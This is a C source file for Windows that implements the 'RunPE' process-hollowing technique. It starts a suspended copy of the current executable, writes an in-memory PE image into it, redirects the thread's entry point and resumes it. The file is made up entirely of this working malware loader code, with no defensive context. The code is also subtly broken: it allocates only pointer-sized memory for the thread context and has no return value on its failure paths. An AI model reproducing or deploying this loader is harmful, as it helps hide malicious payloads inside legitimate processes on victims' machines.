#include <string.h>
#include <Windows.h>
#include <TlHelp32.h>

// Reference: https://github.com/codecrack3/Run-PE---Run-Portable-Executable-From-Memory
int RunPortableExecutable(void* Image)
{
    IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
    IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    CONTEXT* CTX;

    void* pImageBase; // Pointer to the image base

    int count;
    char CurrentFilePath[1024];

    DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
    NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize

    GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable

    if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
    {
        ZeroMemory(&PI, sizeof(PI)); // Null the memory
        ZeroMemory(&SI, sizeof(SI)); // Null the memory

        if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
            //process in suspended state, for the new image.
        {
            // Allocate memory for the context.
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
            {
                pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
                    NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                // Write the image to the process
                WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

                for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
                {
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

                    WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
                        LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
                }
                WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
                    LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

                // Move address of entry point to the Eax register
                CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
                ResumeThread(PI.hThread); //´Start the process/call main()

                return 0; // Operation was successful.
            }
        }
    }
}